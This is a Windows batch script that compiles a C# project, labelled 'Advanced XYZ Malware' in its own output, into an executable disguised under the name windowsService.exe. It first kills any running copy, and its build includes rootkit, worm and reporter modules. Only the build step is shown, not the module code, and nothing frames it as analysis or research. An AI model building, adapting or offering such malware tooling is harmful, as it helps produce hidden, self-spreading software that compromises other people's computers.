@echo off
echo Compiling Advanced XYZ Malware...

REM Kill any existing instances
taskkill /f /im windowsService.exe 2>nul

REM Set the .NET Framework 4.0 path
set DOTNET_PATH="C:\Windows\Microsoft.NET\Framework\v4.0.30319"

REM Compile all C# files with .NET Framework 4.0 (C# 5 compatible)
%DOTNET_PATH%\csc.exe /target:winexe /out:windowsService.exe /platform:x64 ^
  /reference:System.Management.dll ^
  /reference:System.Web.Extensions.dll ^
  /reference:System.Drawing.dll ^
  /reference:System.Windows.Forms.dll ^
  /reference:Microsoft.CSharp.dll ^
  /reference:System.Core.dll ^
  /reference:System.Data.dll ^
  /reference:System.Data.DataSetExtensions.dll ^
  /reference:System.Xml.Linq.dll ^
  /reference:System.Xml.dll ^
  /reference:System.Net.Http.dll ^
  /reference:System.IO.Compression.dll ^
  /reference:System.IO.Compression.FileSystem.dll ^
  /win32manifest:app.manifest ^
  app.cs ^
  Properties\AssemblyInfo.cs ^
  modules\*.cs ^
  modules\reporters\*.cs ^
  modules\rootkit\*.cs ^
  modules\worm\*.cs

if %ERRORLEVEL% EQU 0 (
  echo.
  echo Compilation successful!
  echo Output file: windowsService.exe
) else (
  echo.
  echo Compilation failed. Error level: %ERRORLEVEL%
)

pause